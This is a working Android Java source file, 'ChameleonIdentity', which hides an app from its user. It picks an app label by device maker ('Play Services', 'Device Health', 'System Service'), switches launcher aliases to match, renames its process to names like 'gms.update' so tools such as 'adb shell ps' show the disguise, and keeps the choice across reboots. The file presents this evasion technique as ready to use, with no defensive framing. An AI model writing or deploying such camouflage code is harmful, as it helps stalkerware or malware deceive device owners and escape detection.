package com.task.tusker.security;

import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import java.util.List;

/**
 * ChameleonIdentity — runtime app-identity camouflage.
 *
 * On first run (and whenever packages change) the app queries all installed
 * packages, scores each candidate host identity, and activates exactly one
 * activity-alias matching the winning identity. All other aliases are disabled.
 *
 * Identity roster (must match aliases declared in AndroidManifest.xml):
 *   Index 0  ChameleonAlias0  "System Service"          — universal fallback
 *   Index 1  ChameleonAlias1  "Play Services"           — Google-certified device
 *   Index 2  ChameleonAlias2  "Device Health"           — Samsung device
 *   Index 3  ChameleonAlias3  "Sync Manager"            — Xiaomi / MIUI device
 *   Index 4  ChameleonAlias4  "Storage Manager"         — OPPO / ColorOS device
 *
 * The selected identity is persisted in SharedPreferences so it survives
 * reboots and process restarts without a re-scan.
 *
 * The process is also renamed (via SecurityGuard.renameProcessTo) to the
 * chosen label so `adb shell ps` shows the same name as the launcher icon.
 */
public final class ChameleonIdentity {

    private static final String PREF       = "ci_prefs";
    private static final String KEY_INDEX  = "idx";
    private static final String KEY_STAMP  = "ts";

    /* Seven days in milliseconds — re-evaluate identity after this window */
    private static final long REFRESH_MS = 7L * 24 * 3600 * 1000;

    /**
     * Activity-alias suffix names exactly as declared in AndroidManifest.xml.
     * The full component name is built as "<packageName><ALIAS_SUFFIXES[i]>".
     */
    public static final String[] ALIAS_SUFFIXES = {
        ".ChameleonAlias0",
        ".ChameleonAlias1",
        ".ChameleonAlias2",
        ".ChameleonAlias3",
        ".ChameleonAlias4",
    };

    /**
     * Human-readable process names that match each alias label.
     * Used for prctl-based process renaming (max 15 chars enforced by kernel).
     */
    private static final String[] PROCESS_NAMES = {
        "system_service",   /* System Service   — generic system look */
        "gms.update",       /* Play Services    — Google GMS look */
        "device.health",    /* Device Health    — Samsung health look */
        "sync.manager",     /* Sync Manager     — MIUI / sync service look */
        "storage.mgr",      /* Storage Manager  — file-manager look */
    };

    private ChameleonIdentity() {}

    /* ── Public API ──────────────────────────────────────────────────────── */

    /**
     * Call from MainActivity.onCreate() (and from PackageChangeReceiver).
     * Skips re-selection if the last choice is <7 days old.
     */
    public static void selectIdentity(Context ctx) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE);
            long lastTs = prefs.getLong(KEY_STAMP, 0L);
            int  stored = prefs.getInt(KEY_INDEX, -1);

            boolean stale = (System.currentTimeMillis() - lastTs) > REFRESH_MS;

            int chosen;
            if (stored >= 0 && stored < ALIAS_SUFFIXES.length && !stale) {
                /* Use cached choice — no package scan needed */
                chosen = stored;
            } else {
                chosen = score(ctx);
                prefs.edit()
                     .putInt(KEY_INDEX, chosen)
                     .putLong(KEY_STAMP, System.currentTimeMillis())
                     .apply();
            }

            applyAlias(ctx, chosen);
            SecurityGuard.renameProcessTo(PROCESS_NAMES[chosen]);

        } catch (Exception ignored) {
            /* Fallback: alias 0 is always "System Service" — safe on any device */
            try { applyAlias(ctx, 0); } catch (Exception e2) { /* ignored */ }
        }
    }

    /** Returns the alias index currently active (-1 if never set). */
    public static int currentIndex(Context ctx) {
        return ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
                  .getInt(KEY_INDEX, -1);
    }

    /** Force a fresh identity re-scan regardless of the 7-day cache window. */
    public static void forceRefresh(Context ctx) {
        ctx.getSharedPreferences(PREF, Context.MODE_PRIVATE)
           .edit().putLong(KEY_STAMP, 0L).apply();
        selectIdentity(ctx);
    }

    /* ── Scoring ─────────────────────────────────────────────────────────── */

    private static int score(Context ctx) {
        PackageManager pm = ctx.getPackageManager();
        List<PackageInfo> pkgs;
        try {
            pkgs = pm.getInstalledPackages(0);
        } catch (Exception e) {
            return 0;
        }

        boolean hasGoogle  = false;
        boolean hasSamsung = false;
        boolean hasMiui    = false;
        boolean hasOppo    = false;

        for (PackageInfo pi : pkgs) {
            if (pi == null || pi.packageName == null) continue;
            String pn = pi.packageName;
            if (pn.startsWith("com.google."))           hasGoogle  = true;
            if (pn.startsWith("com.samsung."))          hasSamsung = true;
            if (pn.startsWith("com.miui."))             hasMiui    = true;
            if (pn.startsWith("com.coloros.")
             || pn.startsWith("com.oplus.")
             || pn.startsWith("com.oppo."))              hasOppo    = true;
        }

        /* Priority order: Google → Samsung → Xiaomi → OPPO → generic */
        if (hasGoogle)  return 1;
        if (hasSamsung) return 2;
        if (hasMiui)    return 3;
        if (hasOppo)    return 4;
        return 0;
    }

    /* ── PackageManager alias toggling ───────────────────────────────────── */

    private static void applyAlias(Context ctx, int chosen) {
        PackageManager pm  = ctx.getPackageManager();
        String         pkg = ctx.getPackageName();

        for (int i = 0; i < ALIAS_SUFFIXES.length; i++) {
            ComponentName cn = new ComponentName(pkg, pkg + ALIAS_SUFFIXES[i]);
            int state = (i == chosen)
                ? PackageManager.COMPONENT_ENABLED_STATE_ENABLED
                : PackageManager.COMPONENT_ENABLED_STATE_DISABLED;
            try {
                pm.setComponentEnabledSetting(cn, state,
                    PackageManager.DONT_KILL_APP);
            } catch (Exception ignored) {}
        }
    }
}
